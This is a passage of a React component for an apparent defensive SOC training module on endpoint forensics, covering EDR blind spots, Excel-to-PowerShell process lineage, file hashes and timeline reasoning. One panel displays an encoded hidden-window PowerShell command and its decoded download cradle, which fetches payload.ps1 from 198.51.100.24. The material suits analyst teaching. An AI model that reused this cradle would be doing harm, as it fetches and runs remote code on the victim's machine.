                BLIND SPOT: {coverageScenario === 'lolbin' ? 'Certutil.exe carrying valid Microsoft digital signature used to fetch malware' : coverageScenario === 'legacy' ? 'Unmonitored branch printer controller compromised; zero EDR kernel visibility' : 'Attacker loaded vulnerable 3rd-party driver to erase EDR kernel callbacks from Ring 0'}
              </span>
              <p className="text-slate-300">
                {coverageScenario === 'lolbin'
                  ? 'Static reputation will never flag certutil.exe. Analyst must evaluate command line arguments!'
                  : coverageScenario === 'legacy'
                  ? 'Network sensors (TAP/SPAN) must corroborate when endpoints lack modern kernel drivers.'
                  : 'Tampering detection alerts: Process running with zero event telemetry indicates callback erasure.'}
              </p>
            </div>
            <Badge className="bg-amber-500/20 text-amber-300 border-amber-500/30 text-xs">
              ACTIVE VULNERABILITY
            </Badge>
          </div>

          <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-3.5 pt-1">
            {nodes.map((node) => {
              const isSelected = activeNode.id === node.id;
              return (
                <div
                  key={node.id}
                  onClick={() => {
                    sound.playClick();
                    onSelectNode(node);
                  }}
                  className={`p-4 rounded-xl border transition-all cursor-pointer flex flex-col justify-between space-y-3 ${
                    isSelected
                      ? 'bg-sky-500/20 border-sky-400 ring-2 ring-sky-500/40 shadow-[0_0_20px_rgba(56,189,248,0.25)]'
                      : 'bg-slate-900/80 border-slate-800 hover:border-slate-700 hover:bg-slate-800/60'
                  }`}
                >
                  <div className="space-y-2">
                    <div className="flex items-center justify-between">
                      <span className="text-xs font-mono font-semibold text-sky-400">{node.id}</span>
                      {node.badge && (
                        <span className="px-2 py-0.5 rounded text-[11px] font-mono bg-sky-950 border border-sky-500/30 text-sky-300">
                          {node.badge}
                        </span>
                      )}
                    </div>
                    <div className="flex items-center gap-3">
                      <div className="w-12 h-12 rounded-xl bg-sky-500/10 border border-sky-500/30 flex items-center justify-center shrink-0">
                        {node.id === 'lim-living-off-land' ? (
                          <Terminal className="w-6 h-6 text-amber-400" />
                        ) : node.id === 'lim-unsupported-os' ? (
                          <EyeOff className="w-6 h-6 text-rose-400" />
                        ) : node.id === 'lim-tamper-blindness' ? (
                          <ShieldAlert className="w-6 h-6 text-purple-400" />
                        ) : (
                          <Award className="w-6 h-6 text-emerald-400" />
                        )}
                      </div>
                      <div>
                        <h5 className="font-bold text-sm sm:text-base text-white">{node.label}</h5>
                        <p className="text-xs text-slate-400 font-mono">{node.sub}</p>
                      </div>
                    </div>
                  </div>
                  <p className="text-xs text-slate-300 line-clamp-2">{node.description}</p>
                </div>
              );
            })}
          </div>
        </div>

        {renderInspector(activeNode)}
      </div>
    );
  }

  // ---------------------------------------------------------------------------
  // 7. Process Tree Lineage & LOLBIN Execution (M09-U2-C1 Pillar 1)
  // ---------------------------------------------------------------------------
  if (style === 'm09-process-tree-lineage') {
    const nodes = processTreeLineageNodes;
    const activeNode = nodes.find((n) => n.id === selectedNodeId) || nodes[0];

    const treeSteps = [
      { pid: 2840, name: 'explorer.exe', role: 'User Desktop Shell', status: 'Normal root' },
      { pid: 4820, name: 'excel.exe', role: 'Accounting Document', status: 'VBA macro active' },
      { pid: 5124, name: 'cmd.exe', role: 'Anomalous Child Shell', status: 'ANOMALY: Spawned by Excel!' },
      { pid: 5912, name: 'powershell.exe', role: 'Encoded Runner', status: 'Base64 execution flag' },
    ];

    return (
      <div className="min-h-[480px] sm:min-h-[520px] rounded-2xl bg-[#03091e]/95 border border-slate-800 p-4 sm:p-6 flex flex-col justify-between relative overflow-hidden shadow-2xl w-full">
        <div className="space-y-3">
          <div className="flex flex-wrap items-center justify-between gap-2 border-b border-slate-800 pb-3">
            <div>
              <h4 className="text-base sm:text-lg font-bold text-white flex items-center gap-2">
                <GitCommit className="w-5 h-5 text-sky-400" />
                <span>Process Tree Lineage &bull; Parent-Child Ancestry Tree</span>
              </h4>
              <p className="text-xs sm:text-sm text-slate-300">
                Why is Microsoft Excel spawning cmd.exe and PowerShell? Process hierarchy reveals initial access chains.
              </p>
            </div>
            <Badge className="bg-rose-500/20 text-rose-300 border-rose-500/30 font-mono text-xs">
              ANOMALOUS CHILD DETECTED
            </Badge>
          </div>

          {/* Process Tree Interactive Steps */}
          <div className="p-4 rounded-xl bg-slate-900/90 border border-sky-500/30 space-y-2">
            <span className="text-xs font-mono font-bold text-sky-400 block">
              CASE #2026-881 PROCESS ANCESTRY EXECUTION TREE:
            </span>
            <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-2 font-mono text-xs">
              {treeSteps.map((p) => (
                <div
                  key={p.pid}
                  onClick={() => {
                    sound.playClick();
                    setActivePid(p.pid as any);
                  }}
                  className={`p-2.5 rounded-lg border cursor-pointer transition-all ${
                    activePid === p.pid
                      ? 'bg-sky-500/20 border-sky-400 ring-1 ring-sky-500/40'
                      : 'bg-black/60 border-slate-800 hover:border-slate-700'
                  }`}
                >
                  <div className="flex items-center justify-between pb-1">
                    <span className="font-bold text-white">{p.name}</span>
                    <span className="text-[11px] text-slate-400 font-mono">PID {p.pid}</span>
                  </div>
                  <p className="text-[11px] text-slate-300">{p.role}</p>
                  <p className="text-[11px] text-amber-300/90 pt-0.5">{p.status}</p>
                </div>
              ))}
            </div>
          </div>

          <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-3.5 pt-1">
            {nodes.map((node) => {
              const isSelected = activeNode.id === node.id;
              return (
                <div
                  key={node.id}
                  onClick={() => {
                    sound.playClick();
                    onSelectNode(node);
                  }}
                  className={`p-4 rounded-xl border transition-all cursor-pointer flex flex-col justify-between space-y-3 ${
                    isSelected
                      ? 'bg-sky-500/20 border-sky-400 ring-2 ring-sky-500/40 shadow-[0_0_20px_rgba(56,189,248,0.25)]'
                      : 'bg-slate-900/80 border-slate-800 hover:border-slate-700 hover:bg-slate-800/60'
                  }`}
                >
                  <div className="space-y-2">
                    <div className="flex items-center justify-between">
                      <span className="text-xs font-mono font-semibold text-sky-400">{node.id}</span>
                      {node.badge && (
                        <span className="px-2 py-0.5 rounded text-[11px] font-mono bg-sky-950 border border-sky-500/30 text-sky-300">
                          {node.badge}
                        </span>
                      )}
                    </div>
                    <div className="flex items-center gap-3">
                      <div className="w-12 h-12 rounded-xl bg-sky-500/10 border border-sky-500/30 flex items-center justify-center shrink-0">
                        {node.id === 'proc-root-explorer' ? (
                          <Laptop className="w-6 h-6 text-slate-400" />
                        ) : node.id === 'proc-child-excel' ? (
                          <FileSpreadsheet className="w-6 h-6 text-emerald-400" />
                        ) : node.id === 'proc-anomalous-cmd' ? (
                          <Terminal className="w-6 h-6 text-amber-400" />
                        ) : (
                          <Flame className="w-6 h-6 text-rose-400" />
                        )}
                      </div>
                      <div>
                        <h5 className="font-bold text-sm sm:text-base text-white">{node.label}</h5>
                        <p className="text-xs text-slate-400 font-mono">{node.sub}</p>
                      </div>
                    </div>
                  </div>
                  <p className="text-xs text-slate-300 line-clamp-2">{node.description}</p>
                </div>
              );
            })}
          </div>
        </div>

        {renderInspector(activeNode)}
      </div>
    );
  }

  // ---------------------------------------------------------------------------
  // 8. Command-Line Evidence & Full Execution Path (M09-U2-C1 Pillar 2)
  // ---------------------------------------------------------------------------
  if (style === 'm09-command-line-args') {
    const nodes = commandLineArgsNodes;
    const activeNode = nodes.find((n) => n.id === selectedNodeId) || nodes[0];

    return (
      <div className="min-h-[480px] sm:min-h-[520px] rounded-2xl bg-[#03091e]/95 border border-slate-800 p-4 sm:p-6 flex flex-col justify-between relative overflow-hidden shadow-2xl w-full">
        <div className="space-y-3">
          <div className="flex flex-wrap items-center justify-between gap-2 border-b border-slate-800 pb-3">
            <div>
              <h4 className="text-base sm:text-lg font-bold text-white flex items-center gap-2">
                <FileCode className="w-5 h-5 text-sky-400" />
                <span>Command-Line Evidence &bull; Full ImagePath &amp; Argument Auditing</span>
              </h4>
              <p className="text-xs sm:text-sm text-slate-300">
                Ananya: &quot;The process name is just the vehicle; the command-line arguments reveal the driver&apos;s true mission.&quot;
              </p>
            </div>
            <button
              onClick={() => {
                sound.playClick();
                setCmdView(cmdView === 'encoded' ? 'decoded' : 'encoded');
              }}
              className="px-3 py-1 text-xs font-mono rounded-lg border bg-sky-500/20 text-sky-300 border-sky-500/40 hover:bg-sky-500/30"
            >
              {cmdView === 'encoded' ? 'View: Base64 Decoded Script' : 'View: Raw Encoded CommandLine'}
            </button>
          </div>

          {/* CommandLine Inspector Box */}
          <div className="p-4 rounded-xl bg-slate-900/90 border border-sky-500/30 flex flex-col gap-2 font-mono text-xs">
            <div className="flex items-center justify-between">
              <span className="font-bold text-white flex items-center gap-2">
                <Terminal className="w-4 h-4 text-sky-400" />
                FULL COMMAND LINE OBSERVABLE (Sysmon Event 1)
              </span>
              <Badge className="bg-sky-500/20 text-sky-300 border-sky-500/30 text-[11px] font-mono">
                {cmdView === 'encoded' ? 'BASE64 OBFUSCATED' : 'DECODED OBSERVABLE'}
              </Badge>
            </div>
            <div className="p-2.5 rounded-lg bg-black/60 border border-slate-800 text-slate-200 overflow-x-auto">
              {cmdView === 'encoded'
                ? 'C:\\Windows\\System32\\cmd.exe /c powershell.exe -NoP -NonI -W Hidden -Enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAcwA6AC8ALwAxADkAOAAuADUAMQAuADEAMAAwAC4AMgA0AC8AcABheQBsAG8AYQBkAC4AcABzADEAJwApAA=='
                : 'IEX (New-Object Net.WebClient).DownloadString(\'https://198.51.100.24/payload.ps1\') <-- Web cradle download string!'}
            </div>
          </div>

          <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-3.5 pt-1">
            {nodes.map((node) => {
              const isSelected = activeNode.id === node.id;
              return (
                <div
                  key={node.id}
                  onClick={() => {
                    sound.playClick();
                    onSelectNode(node);
                  }}
                  className={`p-4 rounded-xl border transition-all cursor-pointer flex flex-col justify-between space-y-3 ${
                    isSelected
                      ? 'bg-sky-500/20 border-sky-400 ring-2 ring-sky-500/40 shadow-[0_0_20px_rgba(56,189,248,0.25)]'
                      : 'bg-slate-900/80 border-slate-800 hover:border-slate-700 hover:bg-slate-800/60'
                  }`}
                >
                  <div className="space-y-2">
                    <div className="flex items-center justify-between">
                      <span className="text-xs font-mono font-semibold text-sky-400">{node.id}</span>
                      {node.badge && (
                        <span className="px-2 py-0.5 rounded text-[11px] font-mono bg-sky-950 border border-sky-500/30 text-sky-300">
                          {node.badge}
                        </span>
                      )}
                    </div>
                    <div className="flex items-center gap-3">
                      <div className="w-12 h-12 rounded-xl bg-sky-500/10 border border-sky-500/30 flex items-center justify-center shrink-0">
                        {node.id === 'cli-full-image-path' ? (
                          <Folder className="w-6 h-6 text-emerald-400" />
                        ) : node.id === 'cli-argument-inspection' ? (
                          <FileCode className="w-6 h-6 text-amber-400" />
                        ) : node.id === 'cli-security-context' ? (
                          <Key className="w-6 h-6 text-purple-400" />
                        ) : (
                          <ShieldCheck className="w-6 h-6 text-sky-400" />
                        )}
                      </div>
                      <div>
                        <h5 className="font-bold text-sm sm:text-base text-white">{node.label}</h5>
                        <p className="text-xs text-slate-400 font-mono">{node.sub}</p>
                      </div>
                    </div>
                  </div>
                  <p className="text-xs text-slate-300 line-clamp-2">{node.description}</p>
                </div>
              );
            })}
          </div>
        </div>

        {renderInspector(activeNode)}
      </div>
    );
  }

  // ---------------------------------------------------------------------------
  // 9. File Name Homographs vs Cryptographic Hashes (M09-U2-C1 Pillar 3)
  // ---------------------------------------------------------------------------
  if (style === 'm09-file-identity-hashes') {
    const nodes = fileNameHashesNodes;
    const activeNode = nodes.find((n) => n.id === selectedNodeId) || nodes[0];

    return (
      <div className="min-h-[480px] sm:min-h-[520px] rounded-2xl bg-[#03091e]/95 border border-slate-800 p-4 sm:p-6 flex flex-col justify-between relative overflow-hidden shadow-2xl w-full">
        <div className="space-y-3">
          <div className="flex flex-wrap items-center justify-between gap-2 border-b border-slate-800 pb-3">
            <div>
              <h4 className="text-base sm:text-lg font-bold text-white flex items-center gap-2">
                <Hash className="w-5 h-5 text-sky-400" />
                <span>File Name Homographs vs Cryptographic Hashes</span>
              </h4>
              <p className="text-xs sm:text-sm text-slate-300">
                Anyone can name a Trojan &quot;svchost.exe&quot;. Mathematical SHA-256 digests and Authenticode PKI signatures establish real identity.
              </p>
            </div>
            <button
              onClick={() => {
                sound.playClick();
                setFileIdentityMode(fileIdentityMode === 'hash' ? 'name' : 'hash');
              }}
              className="px-3 py-1 text-xs font-mono rounded-lg border bg-sky-500/20 text-sky-300 border-sky-500/40 hover:bg-sky-500/30"
            >
              Mode: {fileIdentityMode === 'hash' ? 'Cryptographic SHA-256 Proof' : 'Unreliable File Name Only'}
            </button>
          </div>

          {/* Hash vs Name Banner */}
          <div className="grid grid-cols-1 md:grid-cols-2 gap-3.5 font-mono text-xs">
            <div className="p-3.5 rounded-xl bg-slate-900/90 border border-emerald-500/30 flex flex-col justify-between">
              <span className="font-bold text-emerald-400 pb-1">GENUINE MICROSOFT SVCHOST.EXE</span>
              <p className="text-slate-300 text-[11px] break-all">
                SHA-256: 8a4c12ef902b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d
              </p>
              <Badge className="bg-emerald-500/20 text-emerald-300 border-emerald-500/30 text-[11px] mt-2 self-start">
                AUTHENTICODE SIGNED: MICROSOFT CORP
              </Badge>
            </div>

            <div className="p-3.5 rounded-xl bg-slate-900/90 border border-rose-500/30 flex flex-col justify-between">
              <span className="font-bold text-rose-400 pb-1">MALICIOUS HOMOGRAPH SVCHOST.EXE</span>
              <p className="text-slate-300 text-[11px] break-all">
                SHA-256: d41d8cd98f00b204e9800998ecf8427e5a6b7c8d9e0f1a2b3c4d5e6f7a8b9c0d
              </p>
              <Badge className="bg-rose-500/20 text-rose-300 border-rose-500/30 text-[11px] mt-2 self-start">
                UNSIGNED / SELF-SIGNED MALWARE 🚨
              </Badge>
            </div>
          </div>

          <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-3.5 pt-1">
            {nodes.map((node) => {
              const isSelected = activeNode.id === node.id;
              return (
                <div
                  key={node.id}
                  onClick={() => {
                    sound.playClick();
                    onSelectNode(node);
                  }}
                  className={`p-4 rounded-xl border transition-all cursor-pointer flex flex-col justify-between space-y-3 ${
                    isSelected
                      ? 'bg-sky-500/20 border-sky-400 ring-2 ring-sky-500/40 shadow-[0_0_20px_rgba(56,189,248,0.25)]'
                      : 'bg-slate-900/80 border-slate-800 hover:border-slate-700 hover:bg-slate-800/60'
                  }`}
                >
                  <div className="space-y-2">
                    <div className="flex items-center justify-between">
                      <span className="text-xs font-mono font-semibold text-sky-400">{node.id}</span>
                      {node.badge && (
                        <span className="px-2 py-0.5 rounded text-[11px] font-mono bg-sky-950 border border-sky-500/30 text-sky-300">
                          {node.badge}
                        </span>
                      )}
                    </div>
                    <div className="flex items-center gap-3">
                      <div className="w-12 h-12 rounded-xl bg-sky-500/10 border border-sky-500/30 flex items-center justify-center shrink-0">
                        {node.id === 'hash-name-homograph' ? (
                          <AlertTriangle className="w-6 h-6 text-amber-400" />
                        ) : node.id === 'hash-sha256-signature' ? (
                          <Hash className="w-6 h-6 text-emerald-400" />
                        ) : node.id === 'hash-authenticode-sig' ? (
                          <CheckCircle2 className="w-6 h-6 text-sky-400" />
                        ) : (
                          <Award className="w-6 h-6 text-purple-400" />
                        )}
                      </div>
                      <div>
                        <h5 className="font-bold text-sm sm:text-base text-white">{node.label}</h5>
                        <p className="text-xs text-slate-400 font-mono">{node.sub}</p>
                      </div>
                    </div>
                  </div>
                  <p className="text-xs text-slate-300 line-clamp-2">{node.description}</p>
                </div>
              );
            })}
          </div>
        </div>

        {renderInspector(activeNode)}
      </div>
    );
  }

  // ---------------------------------------------------------------------------
  // 10. Dual Timestamp Timeline (M09-U2-C2 Pillar 1)
  // ---------------------------------------------------------------------------
  if (style === 'm09-dual-timestamp-timeline') {
    const nodes = dualTimestampTimelineNodes;
    const activeNode = nodes.find((n) => n.id === selectedNodeId) || nodes[0];

    return (
      <div className="min-h-[480px] sm:min-h-[520px] rounded-2xl bg-[#03091e]/95 border border-slate-800 p-4 sm:p-6 flex flex-col justify-between relative overflow-hidden shadow-2xl w-full">
        <div className="space-y-3">
          <div className="flex flex-wrap items-center justify-between gap-2 border-b border-slate-800 pb-3">
            <div>
              <h4 className="text-base sm:text-lg font-bold text-white flex items-center gap-2">
                <Clock className="w-5 h-5 text-sky-400" />
                <span>Dual Timestamp Timeline &bull; Activity Time vs Ingestion Lag</span>
              </h4>
              <p className="text-xs sm:text-sm text-slate-300">
                Ananya: &quot;Always cite activity time with stated ingestion lag. Never move timestamps to fit an expected narrative.&quot;
              </p>
            </div>
            <div className="flex items-center gap-2">
              <button
                onClick={() => {
                  sound.playClick();
                  setTimestampFocus('activity');
                }}
                className={`px-3 py-1 text-xs font-mono rounded-lg border transition-all ${
                  timestampFocus === 'activity'
                    ? 'bg-emerald-500/20 text-emerald-300 border-emerald-500/40 font-bold'
                    : 'bg-slate-900 text-slate-400 border-slate-800 hover:text-white'
                }`}
              >
                Host Activity Time (14:22:04Z)
              </button>
              <button
                onClick={() => {
                  sound.playClick();
                  setTimestampFocus('ingestion');
                }}
                className={`px-3 py-1 text-xs font-mono rounded-lg border transition-all ${
                  timestampFocus === 'ingestion'
                    ? 'bg-sky-500/20 text-sky-300 border-sky-500/40 font-bold'
                    : 'bg-slate-900 text-slate-400 border-slate-800 hover:text-white'
                }`}
              >
                Cloud Ingestion Time (14:22:46Z, 42s Lag)
              </button>
            </div>
          </div>

          {/* Dual Timestamp Demonstration */}
          <div className="p-4 rounded-xl bg-slate-900/90 border border-sky-500/30 flex flex-col sm:flex-row items-center justify-between gap-4 font-mono text-xs">
            <div className="space-y-1 text-left">
              <span className="font-bold text-white flex items-center gap-2">
                <Clock className="w-4 h-4 text-emerald-400" />
                EVENT: Process cmd.exe execution &bull; Host Silicon: 14:22:04.108Z &rarr; EDR Cloud: 14:22:46.820Z
              </span>
              <p className="text-slate-300">
                Ingestion Lag: 42.712 seconds. Network buffer flushed successfully. Forensic anchor remains 14:22:04Z.
              </p>
            </div>
            <Badge className="bg-emerald-500/20 text-emerald-300 border-emerald-500/30 text-xs">
              DUAL TIMESTAMPS PRESERVED ✓
            </Badge>
          </div>

          <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-3.5 pt-1">
            {nodes.map((node) => {
              const isSelected = activeNode.id === node.id;
              return (
                <div
                  key={node.id}
                  onClick={() => {
                    sound.playClick();
                    onSelectNode(node);
                  }}
                  className={`p-4 rounded-xl border transition-all cursor-pointer flex flex-col justify-between space-y-3 ${
                    isSelected
                      ? 'bg-sky-500/20 border-sky-400 ring-2 ring-sky-500/40 shadow-[0_0_20px_rgba(56,189,248,0.25)]'
                      : 'bg-slate-900/80 border-slate-800 hover:border-slate-700 hover:bg-slate-800/60'
                  }`}
                >
                  <div className="space-y-2">
                    <div className="flex items-center justify-between">
                      <span className="text-xs font-mono font-semibold text-sky-400">{node.id}</span>
                      {node.badge && (
                        <span className="px-2 py-0.5 rounded text-[11px] font-mono bg-sky-950 border border-sky-500/30 text-sky-300">
                          {node.badge}
                        </span>
                      )}
                    </div>
                    <div className="flex items-center gap-3">
                      <div className="w-12 h-12 rounded-xl bg-sky-500/10 border border-sky-500/30 flex items-center justify-center shrink-0">
                        {node.id === 'time-activity-local' ? (
                          <Activity className="w-6 h-6 text-emerald-400" />
                        ) : node.id === 'time-ingest-cloud' ? (
                          <Database className="w-6 h-6 text-sky-400" />
                        ) : node.id === 'time-preservation-rule' ? (
                          <Lock className="w-6 h-6 text-purple-400" />
                        ) : (
                          <Award className="w-6 h-6 text-amber-400" />
                        )}
                      </div>
                      <div>
                        <h5 className="font-bold text-sm sm:text-base text-white">{node.label}</h5>
                        <p className="text-xs text-slate-400 font-mono">{node.sub}</p>
                      </div>
                    </div>
                  </div>
                  <p className="text-xs text-slate-300 line-clamp-2">{node.description}</p>
                </div>
              );
            })}
          </div>
        </div>

        {renderInspector(activeNode)}
      </div>
    );
  }

  // ---------------------------------------------------------------------------
  // 11. Temporal Fallacy (Post Hoc Ergo Propter Hoc) (M09-U2-C2 Pillar 2)
  // ---------------------------------------------------------------------------
  if (style === 'm09-temporal-fallacy') {
    const nodes = temporalFallacyNodes;
    const activeNode = nodes.find((n) => n.id === selectedNodeId) || nodes[0];

    return (
      <div className="min-h-[480px] sm:min-h-[520px] rounded-2xl bg-[#03091e]/95 border border-slate-800 p-4 sm:p-6 flex flex-col justify-between relative overflow-hidden shadow-2xl w-full">
        <div className="space-y-3">
          <div className="flex flex-wrap items-center justify-between gap-2 border-b border-slate-800 pb-3">
            <div>
              <h4 className="text-base sm:text-lg font-bold text-white flex items-center gap-2">
                <Ban className="w-5 h-5 text-amber-400" />
                <span>The Temporal Fallacy &bull; Sequence Alone Does Not Establish Cause</span>
              </h4>
              <p className="text-xs sm:text-sm text-slate-300">
                Ananya: &quot;The timeline helps the investigation without becoming a fictional attack script. Keep facts and hypotheses strictly separate.&quot;
              </p>
            </div>
            <button
              onClick={() => {
                sound.playClick();
                setCausalityMode(causalityMode === 'verified' ? 'fallacy' : 'verified');
              }}
              className={`px-3 py-1 text-xs font-mono rounded-lg border transition-all ${
                causalityMode === 'verified'
                  ? 'bg-emerald-500/20 text-emerald-300 border-emerald-500/40 font-bold'
                  : 'bg-rose-500/20 text-rose-300 border-rose-500/40 font-bold'
              }`}
            >
              {causalityMode === 'verified' ? 'Verified ParentProcessId Proof' : 'Fictional Sequence Trap'}
            </button>
          </div>

          {/* Fallacy vs Proof Box */}
          <div
            className={`p-4 rounded-xl border flex flex-col sm:flex-row items-center justify-between gap-4 font-mono text-xs transition-all ${
              causalityMode === 'verified'
                ? 'bg-emerald-950/30 border-emerald-500/40 text-emerald-200'
                : 'bg-rose-950/30 border-rose-500/40 text-rose-200'
            }`}
          >
            <div className="space-y-1 text-left">
              <span className="font-bold flex items-center gap-2">
                {causalityMode === 'verified' ? (
                  <CheckCircle2 className="w-4 h-4 text-emerald-400" />
                ) : (
                  <AlertTriangle className="w-4 h-4 text-rose-400" />
                )}
                {causalityMode === 'verified'
                  ? 'MATHEMATICAL PROOF: cmd.exe ParentProcessId field explicitly contains Excel PID 4820.'
                  : 'FALLACY: "Event B happened 3s after Event A, therefore Event A caused Event B!"'}
              </span>
              <p className="text-slate-300">
                {causalityMode === 'verified'
                  ? 'Hard telemetry linkage. Verified causation proven without inventing an attack story.'
                  : 'Independent background processes overlap constantly on enterprise operating systems.'}
              </p>
            </div>
            <Badge
              className={`font-mono text-xs ${
                causalityMode === 'verified'
                  ? 'bg-emerald-500/20 text-emerald-300 border-emerald-500/30'
                  : 'bg-rose-500/20 text-rose-300 border-rose-500/30'
              }`}
            >
              {causalityMode === 'verified' ? 'VERIFIABLE LINK ✓' : 'POST HOC FALLACY ❌'}
            </Badge>
          </div>

          <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-3.5 pt-1">
            {nodes.map((node) => {
              const isSelected = activeNode.id === node.id;
              return (
                <div
                  key={node.id}
                  onClick={() => {
                    sound.playClick();
                    onSelectNode(node);
                  }}
                  className={`p-4 rounded-xl border transition-all cursor-pointer flex flex-col justify-between space-y-3 ${
                    isSelected
                      ? 'bg-sky-500/20 border-sky-400 ring-2 ring-sky-500/40 shadow-[0_0_20px_rgba(56,189,248,0.25)]'
                      : 'bg-slate-900/80 border-slate-800 hover:border-slate-700 hover:bg-slate-800/60'
                  }`}
                >
                  <div className="space-y-2">
                    <div className="flex items-center justify-between">
                      <span className="text-xs font-mono font-semibold text-sky-400">{node.id}</span>
                      {node.badge && (
                        <span className="px-2 py-0.5 rounded text-[11px] font-mono bg-sky-950 border border-sky-500/30 text-sky-300">
                          {node.badge}
                        </span>
                      )}
                    </div>
                    <div className="flex items-center gap-3">
                      <div className="w-12 h-12 rounded-xl bg-sky-500/10 border border-sky-500/30 flex items-center justify-center shrink-0">
                        {node.id === 'fall-sequence-trap' ? (
                          <AlertTriangle className="w-6 h-6 text-amber-400" />
                        ) : node.id === 'fall-fictional-script' ? (
                          <Ban className="w-6 h-6 text-rose-400" />
                        ) : node.id === 'fall-parent-child-proof' ? (
                          <CheckCircle2 className="w-6 h-6 text-emerald-400" />
                        ) : (
                          <Award className="w-6 h-6 text-purple-400" />
                        )}
                      </div>
                      <div>
                        <h5 className="font-bold text-sm sm:text-base text-white">{node.label}</h5>
                        <p className="text-xs text-slate-400 font-mono">{node.sub}</p>
                      </div>
                    </div>
                  </div>
                  <p className="text-xs text-slate-300 line-clamp-2">{node.description}</p>
                </div>
              );
            })}
          </div>
        </div>

        {renderInspector(activeNode)}
      </div>
    );
  }

  // ---------------------------------------------------------------------------
  // 12. Unified Multi-Source Case Timeline (M09-U2-C2 Pillar 3)
  // ---------------------------------------------------------------------------
  if (style === 'm09-utc-multi-source-align') {
    const nodes = utcMultiSourceAlignNodes;
    const activeNode = nodes.find((n) => n.id === selectedNodeId) || nodes[0];

    const tracks = [
      { track: 'identity', time: '14:21:40Z', label: 'Kerberos TGT granted to ramesh (BLR-DC-01)' },
      { track: 'endpoint', time: '14:22:04Z', label: 'cmd.exe spawned by excel.exe (BLR-BR-WS-04)' },
      { track: 'network', time: '14:22:12Z', label: 'TCP SYN to 198.51.100.24:443 (TAP-01 Wire)' },
    ];

    return (
      <div className="min-h-[480px] sm:min-h-[520px] rounded-2xl bg-[#03091e]/95 border border-slate-800 p-4 sm:p-6 flex flex-col justify-between relative overflow-hidden shadow-2xl w-full">
        <div className="space-y-3">
          <div className="flex flex-wrap items-center justify-between gap-2 border-b border-slate-800 pb-3">
            <div>
              <h4 className="text-base sm:text-lg font-bold text-white flex items-center gap-2">
                <Workflow className="w-5 h-5 text-sky-400" />
                <span>Unified Multi-Source Case Timeline &bull; Identity + Host + Network</span>
              </h4>
              <p className="text-xs sm:text-sm text-slate-300">
                Ananya: &quot;With endpoint logs from our team, network packets from Meera, and event logs from Ravi, the case file has complete integrity.&quot;
              </p>
            </div>
            <div className="flex items-center gap-1.5">
              {(['all', 'endpoint', 'network', 'identity'] as const).map((t) => (
                <button
                  key={t}
                  onClick={() => {
                    sound.playClick();
                    setActiveTrack(t);
                  }}
                  className={`px-2.5 py-1 text-xs font-mono rounded-lg border uppercase transition-all ${
                    activeTrack === t
                      ? 'bg-sky-500/20 text-sky-300 border-sky-500/40 font-bold'
                      : 'bg-slate-900 text-slate-400 border-slate-800 hover:text-white'
                  }`}
                >
                  {t}
                </button>
              ))}
            </div>
          </div>

          {/* Multi-Track Display Box */}
          <div className="p-4 rounded-xl bg-slate-900/90 border border-sky-500/30 space-y-2 font-mono text-xs">
            <span className="font-bold text-sky-400 block">
              CASE #2026-881 MASTER MULTI-SENSOR RECONSTRUCTION:
            </span>
            <div className="grid grid-cols-1 md:grid-cols-3 gap-2">
              {tracks.map((tr, idx) => (
                <div key={idx} className="p-2.5 rounded-lg bg-black/60 border border-slate-800 space-y-1">
                  <span className="text-emerald-400 font-bold block">{tr.time}</span>
                  <p className="text-[11px] text-slate-400 uppercase">TRACK: {tr.track}</p>
                  <p className="text-slate-200 text-[11px]">{tr.label}</p>
                </div>
              ))}
            </div>
          </div>

          <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-3.5 pt-1">
            {nodes.map((node) => {
              const isSelected = activeNode.id === node.id;
              return (
                <div
                  key={node.id}
                  onClick={() => {
                    sound.playClick();
                    onSelectNode(node);
                  }}
                  className={`p-4 rounded-xl border transition-all cursor-pointer flex flex-col justify-between space-y-3 ${
                    isSelected
                      ? 'bg-sky-500/20 border-sky-400 ring-2 ring-sky-500/40 shadow-[0_0_20px_rgba(56,189,248,0.25)]'
                      : 'bg-slate-900/80 border-slate-800 hover:border-slate-700 hover:bg-slate-800/60'
                  }`}
                >
                  <div className="space-y-2">
                    <div className="flex items-center justify-between">
                      <span className="text-xs font-mono font-semibold text-sky-400">{node.id}</span>
                      {node.badge && (
                        <span className="px-2 py-0.5 rounded text-[11px] font-mono bg-sky-950 border border-sky-500/30 text-sky-300">
                          {node.badge}
                        </span>
                      )}
                    </div>
                    <div className="flex items-center gap-3">
                      <div className="w-12 h-12 rounded-xl bg-sky-500/10 border border-sky-500/30 flex items-center justify-center shrink-0">
                        {node.id === 'align-edr-process' ? (
                          <Laptop className="w-6 h-6 text-emerald-400" />
                        ) : node.id === 'align-network-pcap' ? (
                          <Network className="w-6 h-6 text-sky-400" />
                        ) : node.id === 'align-dc-auth-log' ? (
                          <Key className="w-6 h-6 text-purple-400" />
                        ) : (
                          <Award className="w-6 h-6 text-amber-400" />
                        )}
                      </div>
                      <div>
                        <h5 className="font-bold text-sm sm:text-base text-white">{node.label}</h5>
                        <p className="text-xs text-slate-400 font-mono">{node.sub}</p>
                      </div>
                    </div>
                  </div>
                  <p className="text-xs text-slate-300 line-clamp-2">{node.description}</p>
                </div>
              );
            })}
          </div>
        </div>

        {renderInspector(activeNode)}
      </div>
    );
  }

  // ---------------------------------------------------------------------------
  // 13. Threat Indicator Enrichment & Reputation Triad (M09-U3-C1 Pillar 1)
  // ---------------------------------------------------------------------------
  if (style === 'm09-indicator-reputation-triad') {
    const nodes = indicatorReputationTriadNodes;
    const activeNode = nodes.find((n) => n.id === selectedNodeId) || nodes[0];

    return (
      <div className="min-h-[480px] sm:min-h-[520px] rounded-2xl bg-[#03091e]/95 border border-slate-800 p-4 sm:p-6 flex flex-col justify-between relative overflow-hidden shadow-2xl w-full">
